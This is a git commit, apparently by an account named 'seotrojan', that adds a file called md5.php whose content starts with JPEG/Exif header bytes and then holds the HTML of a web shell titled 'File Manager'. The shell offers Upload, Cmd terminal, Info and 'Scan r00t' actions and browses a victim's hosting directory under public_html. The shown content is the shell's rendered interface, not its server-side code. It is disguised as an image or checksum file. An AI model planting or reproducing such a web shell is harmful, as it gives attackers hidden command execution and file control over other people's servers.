67ede583713e9046a73694fcdac263066ea5492e
seotrojan <ampnolimithoki01@gmail.com>
2024-06-05 01:41:35 +0700

    Create md5.php

---
+++ md5.php
@@ -0,0 +1,59 @@
+
+����JFIF,,���(ExifMM*
+�J
+QQQ<!DOCTYPE html>
+<html>
+<head>
+	<title>File Manager</title>
+	<meta name="viewport" content="width=device-width, initial-scale=0.5">
+	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
+	<link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.15.3/css/all.css">
+	<link href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-dark@4/dark.css" rel="stylesheet">
+	<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.js"></script>
+	<link href="https://fonts.googleapis.com/css2?family=Ubuntu+Mono" rel="stylesheet">
+</head>
+<style>
+* {
+	font-family: Ubuntu Mono;
+}
+a {
+	text-decoration: none;
+}
+a:hover {
+	color: white;
+}
+</style>
+<body class="bg-dark text-light">
+	<div class="container-fluid">
+		<div class="py-3" id="main">
+			<div class="box shadow bg-dark p-4 rounded-3">
+				<h3><i class="fad fa-bug"></i>&nbsp;File Manager</h3>
+				<div class="table-responsive"><i class="fad fa-folders"></i>&nbsp;:&nbsp;<a href="?d=/" class="text-light">/</a>
+<a href="?d=%2Fhome">home</a>/
+<a href="?d=%2Fhome%2Fu1069917">pungo</a>/
+<a href="?d=%2Fhome%2Fu1069917%2Fpublic_html">public_html</a>/
+<a href="?d=%2Fhome%2Fu1069917%2Fpublic_html%2Fsmart">eka-prasetya</a>/
+<a href="?d=%2Fhome%2Fu1069917%2Fpublic_html%2Fsmart%2Fassets">assets</a>/
+<a href="?d=%2Fhome%2Fu1069917%2Fpublic_html%2Fsmart%2Fassets%2Fimg">img</a>/
+</div>
+			<div class="btn-group my-3">
+				<a class="btn btn-outline-light btn-sm" href="?"><i class="fad fa-home"></i>&nbsp;Home</a>
+				<a class="btn btn-outline-light btn-sm" href="?d=%2Fhome%2Fu1069917%2Fpublic_html%2Fsmart%2Fassets%2Fimg&up"><i class="fad fa-upload"></i>&nbsp;Upload</a>
+				<a class="btn btn-outline-light btn-sm" href="?d=%2Fhome%2Fu1069917%2Fpublic_html%2Fsmart%2Fassets%2Fimg&cmd"><i class="fad fa-terminal"></i>&nbsp;Cmd</a>
+				<a class="btn btn-outline-light btn-sm" href="?d=%2Fhome%2Fu1069917%2Fpublic_html%2Fsmart%2Fassets%2Fimg&info"><i class="fad fa-info"></i>&nbsp;Info</a>
+				<a class="btn btn-outline-light btn-sm" href="?d=%2Fhome%2Fu1069917%2Fpublic_html%2Fsmart%2Fassets%2Fimg&root"><i class="fad fa-search"></i>&nbsp;Scan r00t</a>
+				<a class="btn btn-outline-light btn-sm" href="?d=%2Fhome%2Fu1069917%2Fpublic_html%2Fsmart%2Fassets%2Fimg&out"><i class="fad fa-sign-out-alt"></i></i>&nbsp;Logout</a>
+			</div>
+				</div>
+	</div>
+</div>
+<!-- respon nya -->
+
+<div class="container-fluid">
+	<div class="box shadow bg-dark p-4 rounded-3">
+		<div class="mb-3">
+			<h5><i class="fad fa-file"></i>:1709644305_7b2e40fbb84fe56c615a.php</h5>
+			<textarea class="form-control form-control-sm mb-3" rows="7"></textarea>
+		</div>
+	</div>
+</div>
